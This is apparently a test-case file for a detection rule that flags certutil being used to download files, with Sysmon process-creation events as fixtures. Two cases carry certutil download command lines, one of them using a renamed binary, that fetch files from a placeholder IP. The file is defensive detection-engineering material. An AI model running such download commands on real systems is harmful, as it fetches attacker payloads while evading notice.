rule: certutil_download.yml
cases:
  - name:   urlcache with a slash switch
    expect: match
    event:
      channel:     Microsoft-Windows-Sysmon/Operational
      event_id:    1
      Image:       C:\Windows\System32\certutil.exe
      CommandLine: certutil.exe /urlcache /split /f http://198.51.100.7/a.exe C:\Users\Public\a.exe

  - name:   renamed binary caught by OriginalFileName
    expect: match
    event:
      channel:     Microsoft-Windows-Sysmon/Operational
      event_id:    1
      Image:            C:\Users\Public\cu.exe
      OriginalFileName: CertUtil.exe
      CommandLine:      cu.exe -verifyctl -f -split https://198.51.100.7/a.txt

  - name:   certutil hashing a file
    expect: no-match
    event:
      channel:     Microsoft-Windows-Sysmon/Operational
      event_id:    1
      Image:       C:\Windows\System32\certutil.exe
      CommandLine: certutil.exe -hashfile C:\Temp\setup.msi SHA256
